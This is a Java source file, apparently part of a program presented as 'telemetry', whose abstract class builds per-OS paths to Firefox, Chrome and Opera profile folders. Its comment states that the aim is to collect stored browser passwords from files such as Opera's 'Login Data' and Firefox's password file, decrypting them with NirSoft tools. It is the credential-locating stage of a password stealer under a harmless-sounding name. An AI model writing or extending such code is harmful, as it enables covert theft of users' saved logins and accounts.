package sample.telemetry.browser;

import org.apache.commons.lang3.SystemUtils;
import sample.telemetry.Feed;

public abstract class GenericBrowser {

   private final Feed feed;

   public GenericBrowser() {
      feed = Feed.getFeedInstance();
   }

   /**
    * Gets the current user's Profile folder. After the result is returned, we should check
    * whether there are several profile folders, loop through them and collect the needed
    * information.
    * Opera - No need to loop. It has a <i>Login Data</i> file, that stores all PWs. Need
    * NirSoft for decryption.
    * Firefox - The profile containing folder has a xxxxxxxx.default ending. We need to loop
    * through all folders in the location, and for each of them inside, there is a passw file
    * Chrome - Standard location for the browsers. We extract info from the folder that we
    * already obtained
    * @param browserType
    * @return The Profile location
    */
   public String getBrowserProfileLocation(BrowserInfo browserType) {
      String location = "";

      if(SystemUtils.IS_OS_WINDOWS_7 || SystemUtils.IS_OS_WINDOWS_8 || SystemUtils.IS_OS_WINDOWS_10) {
         String browserName = browserType.getName();
         switch (browserName) {
            case "Firefox" :
               location = "C:\\Users\\" + feed.getUserName() + "\\AppData\\Roaming\\" +
                     "Mozilla\\Firefox\\Profiles\\";
               break;
            case "Chrome":
               location = "C:\\Users\\" + feed.getUserName() + "\\AppData\\Local\\" +
                     "Google\\Chrome\\UserData\\Default";
               break;
            case "Opera":
               location =  "C:\\Users\\" + feed.getUserName() + "\\AppData\\Roaming\\" +
                     "Opera Software\\Opera Stable\\";
               break;
            default:
               location = "";
         }
      }

      else if(SystemUtils.IS_OS_MAC_OSX) {
         String browserName = browserType.getName();
         switch(browserName) {
            case "Firefox" :
               location = "/Users/" + feed.getUserName() + "/Library/Application Support/" + browserName + "/Profiles/";
               break;
            case "Chrome":
               location = "/Users/" + feed.getUserName() + "/Library/Application Support/Google/" + browserName + "/";
               break;
            case "Opera":
               location = "/Users/" + feed.getUserName() + "/Library/Application Support/com.operasoftware.Opera/";
               break;
            default:
               location = "";
         }
      }
      else if(SystemUtils.IS_OS_LINUX) {
         String browserName = browserType.getName();
         switch (browserName) {
            case "Firefox" :
               location = "/home/"+feed.getUserName()+"/.mozilla/firefox/";
               break;
            case "Chrome":
               location = "/home/" + feed.getUserName() + "/.config/google-chrome/default/";
               break;
            case "Opera":
               location = "";
               break;
            default:
               location = "";
         }
      }
      return location;
   }


}
